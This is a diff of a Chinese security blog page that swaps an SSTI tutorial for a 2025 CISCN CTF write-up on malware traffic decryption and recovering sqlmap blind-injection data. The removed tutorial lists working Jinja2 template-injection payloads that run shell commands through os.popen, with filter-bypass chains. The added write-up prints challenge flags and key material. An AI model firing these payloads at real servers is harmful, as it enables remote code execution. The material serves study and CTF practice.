@@ -4,8 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SSTI, marin的小窝">
-    <meta name="description" content="SSTISSTI（服务器端模板注入）当前使用的框架，python 的 flask、 java 的 spring 等都是用户的输入传入控制器，然后根据请求类型和请求的指令发送给对应的业务模块进行业务逻辑判断，数据库读取，最后把结果返回给视图层">
+    <meta name="keywords" content="XXE, marin的小窝">
+    <meta name="description" content="2025 ciscn 威胁检测与网络流量分析忘记那时候写了啥了，重新做一下
+Kiwi
+李华的电脑被植入了恶意程序，恶意程序发送了一个流量包，请你尝试根据截获的流量和病毒样本程序，获取 Windows 用户 Lihua 的登录密码。最终提交格">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +19,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SSTI | marin的小窝</title>
+    <title>XXE | marin的小窝</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
     
 
@@ -249,12 +251,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/15212263_95842155_p0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/95662111_p0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SSTI</h1>
+                    <h1 class="description center-align post-title">XXE</h1>
                 </div>
             </div>
         </div>
@@ -278,8 +280,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">
-                                <span class="chip bg-color">基础漏洞</span>
+                            <a href="/tags/misc/">
+                                <span class="chip bg-color">misc</span>
+                            </a>
+                        
+                            <a href="/tags/wp/">
+                                <span class="chip bg-color">wp</span>
                             </a>
                         
                     </div>
@@ -290,8 +296,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/WEB/" class="post-category">
-                                WEB
+                            <a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                比赛复现
                             </a>
                         
                     </div>
@@ -327,199 +333,435 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h3 id="SSTI（服务器端模板注入）"><a href="#SSTI（服务器端模板注入）" class="headerlink" title="SSTI（服务器端模板注入）"></a><strong>SSTI（服务器端模板注入）</strong></h3><p>当前使用的框架，python 的 flask、 java 的 spring 等都是用户的输入传入控制器，然后根据请求类型和请求的指令发送给对应的业务模块进行业务逻辑判断，数据库读取，最后把结果返回给视图层，渲染后展示给用户</p>
-<p>这个漏洞的成因就是因为服务器端接收到了用户的恶意输入后，没有任何处理就将其作为 web 模板的一部分，模板引擎在渲染目标时，执行了用户插入的恶意语句，导致了信息泄露、代码执行等问题</p>
-<p>模板注入一般都会使用 <code>&#123;&#123;&#125;&#125;</code>​ 包裹恶意代码，因为在渲染函数中，不会对变量进行渲染， <code>&#123;&#123;&#125;&#125;</code> 中的内容会被当作变量解析，所以可以实现模板注入</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/1344396-20200911174631687-758048107-20250728155600-k9i3jco.png" alt="1344396-20200911174631687-758048107"></p>
-<h4 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h4><p>模板是一种将数据转化为实际的视觉表现（HTML）的一种手段<br>模板的好处是数据放到模板中，直接渲染成 html 文本，返回给浏览器，展示快</p>
-<p>这里有两种渲染方式</p>
-<p>后端渲染：数据传输到服务器或者数据直接存储在服务器中，后端使用模板解析这些数据并渲染成 HTML 返回给浏览器</p>
-<p>前端渲染：浏览器从服务器得到的是数据，由浏览器前端渲染成 HTML 给用户</p>
-<p>就比如要在前端显示用户名，但是每个用户的名字不同，我们要接收数据后，渲染到 name 变量中，再展示给用户</p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;html&gt;
-&lt;h1&gt;&#123;$name&#125;&lt;&#x2F;h1&gt;
-&lt;&#x2F;html&gt;</code></pre>
-
-<p>‍</p>
-<h3 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h3><p>这里记录一下 flask 的漏洞</p>
-<p>flask 使用 <code>render_template()</code>​ 来渲染模板，使用这个方法是不会产生 ssti 的，因为输入的内容会先被 <code>render_template()</code> 渲染好，已经不可控了</p>
-<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">@app.route(&quot;&#x2F;login&quot;)
-def login():
-	name &#x3D; 1
-    return render_template(&quot;login.html&quot;,name&#x3D;name)</code></pre>
-
-<p>但是如果偷懒，比如下面直接用格式化拼接用户可控的字符，就会出现 ssti 漏洞</p>
-<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">@app.route(&#39;&#x2F;test&#39;,methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])
-def test():
-    template &#x3D; &#39;&#39;&#39;
-        &lt;div class&#x3D;&quot;center-content error&quot;&gt;
-            &lt;h1&gt;Oops! That page doesn&#39;t exist.&lt;&#x2F;h1&gt;
-            &lt;h3&gt;%s&lt;&#x2F;h3&gt;
-        &lt;&#x2F;div&gt; 
-    &#39;&#39;&#39; %(request.url)
-
-    return render_template_string(template)</code></pre>
-
-<hr>
-<p>在 flask 中，模板有几种语法</p>
-<ol>
-<li><p><code>&#123;% %&#125;</code> 可以用来声明变量，也可以用来构造循环语句和条件语句</p>
- <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% set x &#x3D; &#39;marin&#39; %&#125;  # 声明变量
-&#123;% for i in [&#39;a&#39;,&#39;b&#39;,&#39;c&#39;]%&#125; &#123;&#123;i&#125;&#125; &#123;% endfor %&#125; #循环
-&#123;% if 25&#x3D;5*5 %&#125; &#123;&#123;1&#125;&#125; &#123;% endif %&#125;   #条件</code></pre></li>
-<li><p><code>&#123;&#123; &#125;&#125;</code> 可以用来将表达式打印到模板输出</p>
-</li>
-<li><p>&#96;&#96; 表示未包含在模板输出中的注释</p>
-</li>
-<li><p><code># #</code>​ 可能和 <code>&#123;% %&#125;</code> 有相同的效果</p>
-</li>
-</ol>
-<p>‍</p>
-<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>这里记录一下 payload 经常会用的一些知识点</p>
-<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><blockquote>
-<p>在 python 中，模块可以用 <code>.</code> 访问，但是字典不支持</p>
+                <h1 id="2025-ciscn-威胁检测与网络流量分析"><a href="#2025-ciscn-威胁检测与网络流量分析" class="headerlink" title="2025 ciscn 威胁检测与网络流量分析"></a>2025 ciscn 威胁检测与网络流量分析</h1><p>忘记那时候写了啥了，重新做一下</p>
+<h3 id="Kiwi"><a href="#Kiwi" class="headerlink" title="Kiwi"></a>Kiwi</h3><blockquote>
+<p>李华的电脑被植入了恶意程序，恶意程序发送了一个流量包，请你尝试根据截获的流量和病毒样本程序，获取 Windows 用户 Lihua 的登录密码。最终提交格式为为 NTLM 解密后的密码，格式为 flag{password}</p>
 </blockquote>
-<ul>
-<li><p><code>__class__</code></p>
-<p>用于获取对象的类，在 python 中，所有东西都是对象<br>获取了类之后在 ssti 中就可以得到很多东西了</p>
-</li>
-<li><p><code>__base__</code></p>
-<p>返回一个对象所直接继承的父类</p>
-</li>
-<li><p><code>__mro__</code></p>
-<p>返回一个按继承顺序包含父类的元组</p>
-</li>
-<li><p><code>__subclasses__</code></p>
-<p>返回当前类的所有子类</p>
-</li>
-<li><p><code>__init__</code></p>
-<p>所有原生类都包含的一个方法，用来初始化一个对象，返回的类型是 <code>function</code>​，用来当跳板调用 <code>__globals__</code></p>
-</li>
-<li><p><code>__globals__</code></p>
-<p>是一个 <code>function</code> 对象的属性，用来获取函数下所有可以使用的 module、方法、变量，返回一个字典</p>
-</li>
-<li><p><code>__builtins__</code></p>
-<p>这是一个自动注入到每个作用域中的命名空间，有许多名字到对象之间的映射，其实就相当于字典，但是可以用 <code>.</code> 调用其中的对象</p>
-</li>
-<li><p><code>__str__()</code></p>
-<p>用来转化为字符串，并且可以用下标取字符串 <code>config.__str__()[1]</code></p>
-</li>
-<li><p><code>__getitem__()</code></p>
-<p>这个是用下标访问时的行为，<code>obj[key]</code>​ 就相当于 <code>obj.__getitem__(key)</code>​，就是用在 <code>[]</code> 被 waf</p>
-</li>
-<li><p><code>g</code></p>
-<p><code>&#123;&#123;g&#125;&#125;</code>​ 得到 <code>&lt;flask.g of &#39;flask_ssti&#39;&gt;</code></p>
-</li>
-<li><p><code>request.environ</code></p>
-<p>运行时的环境变量</p>
-</li>
-</ul>
-<h5 id="基础-payload"><a href="#基础-payload" class="headerlink" title="基础 payload"></a>基础 payload</h5><pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; &quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;ls ..&#x2F;&#39;).read() &#125;&#125;</code></pre>
+<p>流量直接筛选</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">(((http) ) &amp;&amp; (ip.src &#x3D;&#x3D; 192.168.206.1)) &amp;&amp; !(http.response.code &#x3D;&#x3D; 404)</code></pre>
 
-<p>‍</p>
-<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; url_for.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;) &#125;&#125;</code></pre>
+<p>这个只筛选到 3 个有回显的数据包</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251116200349-gtirrr9.png" alt="image"></p>
+<p>数据就是加密过了，然后就是要分析恶意程序</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251112134528.png" alt="image">这里就尝试一下全靠 ai 做简单逆向</p>
+<p>先将主程序发送给 ai ，ai 给到提示是加密函数是 <code>sub_140082974</code></p>
+<p>跟进将代码给到 ai，得到加密方式是 base64 + xor</p>
+<p>先找 base64 的字符表，<code>word_140111070</code> 跟进之后将数据给到 ai</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">d+F3DwWj8tUckVGZb57S1XsLqfm0vnpeMEzQ2Bg&#x2F;PTrohxluiJCRIYAyH6N4aKO9</code></pre>
 
-<p>‍</p>
-<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; lipsum.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read() &#125;&#125;</code></pre>
+<p>然后异或是根据一个字符串计算出一个 seed 的，先找到字符串 <code>word_140111152</code> 然后计算 seed 这里 ai 自己算的我就一直相信了，结果他算的是错的导致一直出问题，这种要跑的还是得自己跑一下</p>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python"># calc_seed.py
+# 计算 Mimikatz 加密的 XOR 种子（基于字符串 &quot;xedSeed&quot;）
 
-<p>‍</p>
-<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; x.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;) &#125;&#125;</code></pre>
+# ------------------------------
+# 1. 种子表（UTF-16LE 编码的 &quot;xedSeed&quot;）
+# ------------------------------
+seed_table_hex &#x3D; &quot;69 00 78 00 65 00 64 00 53 00 65 00 65 00 64 00 00 00&quot;
+# 转为字节
+table_bytes &#x3D; bytes.fromhex(seed_table_hex)
 
-<p>‍</p>
-<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% print (lipsum|attr(__globals__)).os.popen(&#39;ls&#39;).read() %&#125;</code></pre>
+print(f&quot;[+] 种子表 (UTF-16LE): &#123;seed_table_hex&#125;&quot;)
+print(f&quot;[+] 字节: &#123;table_bytes.hex(&#39; &#39;)&#125;&quot;)
 
-<h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><ul>
-<li><p><code>request</code> 绕过</p>
-<p>waf 了 <code>[]</code>​、<code>&quot;&quot;</code> 可以使用</p>
-<p><code>request.args.a</code>​、<code>request.values.a</code>​、<code>request.cookies.a</code></p>
-</li>
-<li><p>字符绕过</p>
-<p><code>&#123;&#123; config.__str__()[1] &#125;&#125;</code> 获取字符</p>
-<p><code>&#123;% str chr=url_for.__globals__.builtins__.chr %&#125;</code>  获取 chr 方法构造字符</p>
-</li>
-<li><p>过滤器绕过</p>
-<ol>
-<li><p><code>attr</code></p>
-<p> 用来动态获取某个属性的值</p>
- <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; obj|attr(&#39;属性&#39;) &#125;&#125;
-&#123;&#123; attr(obj,&#39;属性&#39;) &#125;&#125;</code></pre></li>
-<li><p><code>string|list</code></p>
-<p> 将对象转化为字符串，然后再转化为列表，可以用来获取字符，相当于 <code>str()</code>​、<code>list()</code></p>
- <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; (config|string|list).pop()[i] &#125;&#125;</code></pre></li>
-<li><p><code>join</code></p>
-<p> 把可迭代对象的元素拼接成一个字符串<br> 一般和 <code>dict()</code>​ 配合构造属性，作用于字典时，会将 key 拼接起来，默认用 <code>&#39;&#39;</code> 拼接<br> 作用于元组时，就是直接拼接起来</p>
- <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% set po&#x3D;dict(po&#x3D;a,p&#x3D;b)|join %&#125;
-&#123;% set built&#x3D;(_,_,dict(builtins&#x3D;a)|join,_,_)|join %&#125;</code></pre></li>
-<li><p><code>length</code></p>
-<p> 用于获取数字，会返回字符串长度</p>
- <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% set a&#x3D;dict(a&#x3D;a)|join|length %&#125;</code></pre></li>
-<li><p><code>format</code></p>
-<p> 用于格式化字符串</p>
- <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% print &quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95) %&#125;
-# __class__</code></pre></li>
-<li><p><code>replace</code></p>
-<p> 替换字符串</p>
- <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% print &quot;__claee__&quot;|replace(&#39;e&#39;,&#39;s&#39;) %&#125;
-# __class__</code></pre></li>
-<li><p><code>reverse</code></p>
-<p> 反转字符串</p>
- <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% print &quot;__ssalc__&quot;|reverse %&#125;
-# __class__</code></pre></li>
-<li><p><code>select</code></p>
-<p> 原本是原来筛选元素的，但是作用于空元组时，会生成一个生成器对象，然后配合 <code>string|list</code> 获取字符</p>
- <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% set a&#x3D;(()|select|string|list)|attr(pop)(24) %&#125;</code></pre></li>
-</ol>
-</li>
-<li><p>反弹 shell</p>
-</li>
-<li><p>全角字符替代</p>
-<p>可以用全角的数字替代数字</p>
-<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">def half2full(half):  
-    full &#x3D; &#39;&#39;  
-    for ch in half:  
-        if ord(ch) in range(33, 127):  
-            ch &#x3D; chr(ord(ch) + 0xfee0)  
-        elif ord(ch) &#x3D;&#x3D; 32:  
-            ch &#x3D; chr(0x3000)  
-        else:  
-            pass  
-        full +&#x3D; ch  
-    return full  
-t&#x3D;&#39;&#39;
-s&#x3D;&quot;0123456789&quot;
-for i in s:
-    t+&#x3D;&#39;\&#39;&#39;+half2full(i)+&#39;\&#39;,&#39;
-print(t)</code></pre>
-</li>
-<li><p>十六进制编码绕过</p>
-<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% print &quot;\x5f\x5fclass\x5f\x5f&quot; %&#125;
-# __class__</code></pre>
-</li>
-<li><p>绕过 <code>.</code>​ 和 <code>[]</code> 的 waf</p>
-<p>比如这个 paylaod ，最后使用的可以完全用 <code>attr</code>​ 来绕过，这里同时绕过了 <code>&#39;&#39;</code>​ ，如果正常使用的 <code>attr()</code>​ 这里是要输入字符串，不能用 <code>&#39;&#39;</code> 就需要在前面拼接出字符串再使用</p>
-<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% set po&#x3D;dict(po&#x3D;a,p&#x3D;a)|join %&#125;
-&#123;% set a&#x3D;(()|select|string|list)|attr(po)(24) %&#125;
-&#123;% set ini&#x3D;(a,a,dict(in&#x3D;a,it&#x3D;a)|join,a,a)|join %&#125;
-&#123;% set glo&#x3D;(a,a,dict(glo&#x3D;a,bals&#x3D;a)|join,a,a)|join %&#125;
-&#123;% set getitem&#x3D;(a,a,dict(get&#x3D;a,item&#x3D;a)|join,a,a)|join %&#125;
-&#123;% set popen&#x3D;dict(popen&#x3D;a)|join %&#125;
-&#123;% set read&#x3D;dict(read&#x3D;a)|join %&#125;
-&#123;% set o&#x3D;dict(os&#x3D;a)|join %&#125;
-&#123;% set cmd&#x3D;dict(dir&#x3D;a)|join %&#125;
-&#123;&#123; (lipsum|attr(glo))|attr(getitem)(o)|attr(popen)(cmd)|attr(read)() &#125;&#125;</code></pre>
-</li>
-<li><p>过滤了 <code>[]</code>​ 可以使用 <code>getitem</code> 获取</p>
-</li>
-</ul>
+# ------------------------------
+# 2. 种子生成算法（与 sub_140082974 完全一致）
+# ------------------------------
+v5 &#x3D; 70  # 初始值 &#39;F&#39;
+v6 &#x3D; 0   # 累加器（最终种子）
+v8 &#x3D; 1   # 计数器 i
+v7 &#x3D; 0   # 表索引
+
+print(&quot;\n[+] 逐轮计算过程：&quot;)
+i &#x3D; 1
+while True:
+    print(f&quot;  轮次 &#123;i:2d&#125;: v5 &#x3D; 0x&#123;v5:02X&#125; (&#39;&#123;chr(v5) if 32 &lt;&#x3D; v5 &lt;&#x3D; 126 else &#39;?&#39;&#125;&#39;), &quot;
+          f&quot;v8 &#x3D; &#123;v8&#125;, v6 &#x3D; &#123;v6&#125; &quot;, end&#x3D;&quot;&quot;)
+    
+    v6 &#x3D; (v6 + v8 * v5) % 256
+    print(f&quot;→ v6 &#x3D; &#123;v6&#125;&quot;)
+    
+    # 读取下一个 WCHAR 的低字节
+    if v7 &gt;&#x3D; len(table_bytes):
+        break
+    v5 &#x3D; table_bytes[v7]
+    v7 +&#x3D; 2  # 跳过高位 00
+    v8 +&#x3D; 1
+    
+    if v5 &#x3D;&#x3D; 0:
+        break
+
+# ------------------------------
+# 3. 输出最终种子
+# ------------------------------
+print(&quot;\n&quot; + &quot;&#x3D;&quot;*50)
+print(f&quot;  最终种子 (srand 输入): &#123;v6&#125;&quot;)
+print(f&quot;  十六进制: 0x&#123;v6:02X&#125;&quot;)
+print(f&quot;  十进制: &#123;v6&#125;&quot;)
+print(&quot;&#x3D;&quot;*50)
+
+# ------------------------------
+# 4. 验证：生成前 10 个 rand() % 128
+# ------------------------------
+def vc_rand(state):
+    state &#x3D; (state * 214013 + 2531011) &amp; 0xFFFFFFFF
+    return (state &gt;&gt; 16) &amp; 0x7FFF, state
+
+print(&quot;\n[+] 前 10 个 rand() % 128 值（用于调试解密）：&quot;)
+state &#x3D; v6
+for i in range(1, 11):
+    r, state &#x3D; vc_rand(state)
+    print(f&quot;  [&#123;i:2d&#125;] rand() &#x3D; &#123;r:5d&#125; → %128 &#x3D; &#123;r % 128&#125;&quot;)</code></pre>
+
+<p>得到最后的种子是 105</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251112135108.png" alt="image"></p>
+<p>然后就有了最终解密脚本</p>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python"># final_decrypt.py
+b64_str &#x3D; &quot;l1Mvs8wZ1LI&#x2F;v3Vup1zF8bzdp1B51zz0e0xdfIXNBQMOe1wFEg+Z03ljczfC1qGdp0Y6bWnJ7rUqnQrZmVT9nFPRXqYpURBxuBKInjI5Q2xVgs56q4VRCQWbiyv00Aw7D0CKEotHSy6sQAC1x3T9wDx6xPCioqx&#x2F;0nwNgrvJnF1Oq7NFZsVpnAxaZC5BVfKSEttFPjYgv3uSfmtxeJg7pPCHmJ8qf&#x2F;Sd7W7n3gKSB2BELb&#x3D;&#x3D;&quot;
+
+CUSTOM_B64_TABLE &#x3D; &#39;d+F3DwWj8tUckVGZb57S1XsLqfm0vnpeMEzQ2Bg&#x2F;PTrohxlu iJCRIYAyH6N4aKO9&#39;.replace(&#39; &#39;, &#39;&#39;)
+b64_map &#x3D; &#123;c: i for i, c in enumerate(CUSTOM_B64_TABLE)&#125;
+
+SEED &#x3D; 105
+
+def vc_rand(s):
+    s &#x3D; (s * 214013 + 2531011) &amp; 0xFFFFFFFF
+    return (s &gt;&gt; 16) &amp; 0x7FFF, s
+
+# Base64 解码
+dist &#x3D; bytearray()
+i &#x3D; 0
+while i &lt; len(b64_str):
+    chunk &#x3D; b64_str[i:i+4]
+    if len(chunk) &lt; 4: break
+    v &#x3D; [b64_map.get(c, 0) if c !&#x3D; &#39;&#x3D;&#39; else 0 for c in chunk]
+    dist.append((v[0] &lt;&lt; 2) | (v[1] &gt;&gt; 4))
+    if chunk[2] !&#x3D; &#39;&#x3D;&#39;: dist.append(((v[1] &amp; 0xF) &lt;&lt; 4) | (v[2] &gt;&gt; 2))
+    if chunk[3] !&#x3D; &#39;&#x3D;&#39;: dist.append(((v[2] &amp; 0x3) &lt;&lt; 6) | v[3])
+    i +&#x3D; 4
+
+# 逆扰乱
+state &#x3D; SEED
+plain &#x3D; bytearray()
+for b in dist:
+    r, state &#x3D; vc_rand(state)
+    c &#x3D; (b - (r % 128)) &amp; 0xFF
+    c ^&#x3D; SEED
+    plain.extend([c, 0])
+
+text &#x3D; plain.decode(&#39;utf-16le&#39;, errors&#x3D;&#39;replace&#39;)
+print(text)</code></pre>
+
+<p>最后找个网站解密一下</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251112135159.png" alt="image"></p>
+<p><code>flag{memeallme!}</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251112135218.png" alt="image"></p>
+<p>‍</p>
+<h3 id="sxmisc"><a href="#sxmisc" class="headerlink" title="sxmisc"></a>sxmisc</h3><p>先看流量包，学到了原来协议分级是能看到有 MIME 信息的，这个一般是电子邮件或者文件上传中会用到</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251112140729.png" alt="image"></p>
+<p>或者直接找 post 请求，这个流量就是太大了，导致查数据都很麻烦，这里也能看到第二个数据有 jpg 文件</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251112141158.png" alt="image"></p>
+<p>导出来是一个图片，然后就是分析日志</p>
+<p><code>thisisthepassphrasebobknowsbutyoudontknow</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251112141351.png" alt="image"></p>
+<p>可以看到有很多数据库的请求</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251112141426.png" alt="image"></p>
+<p>写脚本处理这里的 sql 盲注数据</p>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">import urllib.parse
+import csv
+import re
+
+with open (&quot;access.log&quot;,&quot;r&quot;)as file:
+    data &#x3D; file.readlines()
+    sql &#x3D; []
+
+    for line in data:
+        log &#x3D; &#123;&#125;
+        http &#x3D; line.split(&quot;\&quot;&quot;)
+        log[&#39;url&#39;] &#x3D; http[1]
+        log[&#39;size&#39;] &#x3D; http[2]
+        log[&#39;ua&#39;] &#x3D; http[5]
+        if &quot;publishers.php&quot; in log[&#39;url&#39;] and &quot;sqlmap&quot; in log[&#39;ua&#39;]:
+            log[&#39;url&#39;] &#x3D; urllib.parse.unquote(log[&#39;url&#39;])
+            pattern &#x3D; r&#39;SUBSTR\(\((.*?)\),(\d+),(\d+)\)(.)CHAR\((\d+)\)&#39;
+            match &#x3D; re.search(pattern,log[&#39;url&#39;])
+            if match:
+                log[&#39;pos&#39;] &#x3D; int(match.group(2))
+                log[&#39;char&#39;] &#x3D; int(match.group(5))
+                log[&#39;sql&#39;] &#x3D; match.group(1)    
+                sql.append(log)
+
+
+# 将数据按照最后的符号分组
+group &#x3D; &#123;&#125;
+for item in sql:
+    pattern &#x3D; r&#39;-- [a-zA-Z]&#123;4&#125;&#39;
+    match &#x3D; re.search(pattern,item[&#39;url&#39;])
+    if match:
+        sign &#x3D; match.group(0)[-4:]
+    else:
+        sign &#x3D; &quot;no sign&quot;
+    if sign not in group:
+        group[sign] &#x3D; &#123;&#125;
+        group[sign][&#39;item&#39;] &#x3D; []
+        group[sign][&#39;item&#39;].append(item)
+    else:
+        group[sign][&#39;item&#39;].append(item)
+
+# 处理二分法
+result &#x3D; &#123;&#125;
+for sign in group:
+    group[sign][&#39;result&#39;] &#x3D; &#123;&#125;
+    for i in group[sign][&#39;item&#39;]:
+        pos &#x3D; i[&#39;pos&#39;]
+        char &#x3D; i[&#39;char&#39;]
+        
+        current &#x3D; group[sign][&#39;result&#39;].get(pos)
+        if current is not None:
+            if &#39;412&#39; in i[&#39;size&#39;] and char &lt;&#x3D; current:
+                group[sign][&#39;result&#39;][pos] &#x3D; char
+        elif &#39;412&#39; in i[&#39;size&#39;]:
+            group[sign][&#39;result&#39;][pos] &#x3D; char
+    group[sign][&#39;flag&#39;] &#x3D; &quot;&quot;    
+    for key,value in group[sign][&#39;result&#39;].items():
+        group[sign][&#39;flag&#39;] +&#x3D; chr(value)
+        
+
+for sign in group:
+    print(group[sign][&#39;item&#39;][1][&#39;sql&#39;])
+    print(sign,group[sign][&#39;flag&#39;])
+
+
+csv_data &#x3D; []
+header &#x3D; [&#39;目标SQL查询&#39;, &#39;还原数据&#39;]
+csv_data.append(header)
+
+for sign in group:
+    sql_query &#x3D; (group[sign][&#39;item&#39;][1][&#39;sql&#39;])
+    data &#x3D; (sign,group[sign][&#39;flag&#39;])
+    csv_data.append([sql_query,data])
+
+with open(&#39;result.csv&#39;, &#39;w&#39;, encoding&#x3D;&#39;utf-8-sig&#39;, newline&#x3D;&#39;&#39;) as csvfile:
+    writer &#x3D; csv.writer(csvfile)
+    writer.writerows(csv_data)</code></pre>
+
+<p>最后找到这个用户的信息</p>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">SELECT COALESCE(CAST(priv_key AS TEXT),CHAR(32)) FROM accounts LIMIT 1,1
+-----BEGIN ENCRYPTED PRIVATE KEY-----
+MIIC3TBXBgkqhkiG9w0BBQ0wSjApBgkqhkiG9w0BBQwwHAQI6LGnQ3HdqfwCAggA
+MAwGCCqGSIb3DQIJBQAwHQYJYIZIAWUDBAEqBBAb&#x2F;JvhvID2VUpp6asXZv+ZBIIC
+gK6Hy9Qu0rt76gqlFkvFY9qWnSyFnyE2hk2egjOHOxaJFWUd5hZcO5Of8zJIgpr+
+cfhgNZJlEC02k1drfc72ql2IYGf+3Q60TqeiV&#x2F;fxH0QMmyklrJVp9F2nnBaV2cGA
+rWvWTaR0+ukVvg6rtc5ayDcuCOp0MBqo7gvS1OPkDtbKD&#x2F;MjbZpE5QstFcZBW22A
+&#x2F;sJS128R5T626BWUq&#x2F;HEM34hYNh3RyDm9CDLyRYrgRs5zUhl8qE3i2hTWfW+Ak9s
+kWdKgbD9ERh9j&#x2F;qV1lN45jIPpTaqYSsxymcRmSu+LFKwTvMnJ8UgKOQKvnsSApU5
++XcaUCXwZH2MuVNK0qHhpiCu6BH+yJgDkGQ1ZCfRo09dsYz2aYzAeUMwzflZQEbB
+nLvznN9MrcHvTvmvz0qzCz7LvV8UwaY83eJIScFCTFCmJp8qY3PYF7HnfrPszSD0
+eBthcb2PUftOmbcsuas6843S1V2q+OrZHFcneB7515xVjD&#x2F;WeaZ2e9BcFqWZ8zuW
+RnEHL8L7wgVnNlj3b4g2nykknUeKbIlQccXcKuSR73j4qVwOfPdsaHmMsumNfxYl
+DkFl2p9jF2Ha7BDpxhepNK3qf9PWhXZRCC0BXGPqGezvSgGXC3SDotcJPeKF8RME
+JlntDDZjgDmYMEDBr+Vm7ceuwMWJTcTGrk4j5yeQp21B5lc1EcnDKHHznbwFFfKo
+PpAASnBdyEAA2nKaN0WZYZuiYUbqxKZoPEZjPS&#x2F;7iUaK40ZJnpIVtISNWNM4ITeq
+rpkmqBTF8e4&#x2F;+iCCjWFHMQ3umRGWetm9QG0kIsaCt&#x2F;fYXj70dkD5S9C9MUpkCZZC
+wGyrLnTG5NImbaKHLqDRTC8&#x3D;
+-----END ENCRYPTED PRIVATE KEY-----
+
+
+SELECT COALESCE(CAST(acc_flag AS TEXT),CHAR(32)) FROM accounts LIMIT 1,1
+Z5WpwbZZZXn9n&#x2F;PAFHeowh9BxYHq7KupFO2ULeH&#x2F;gkDNATbcxzO6KRBB9zDW23F5
+uRODyT1+y0z3iMv6&#x2F;&#x2F;SOYnQqF1NH4S2CQxOXK7KnXQwnKXMBU2Wp3giNPFcvOvgX
+83fJasMKIpjhYw9Jja9DcEoKz4ZEe5LWI3YpgU7Kz0A&#x3D;</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251112165156.png" alt="image"></p>
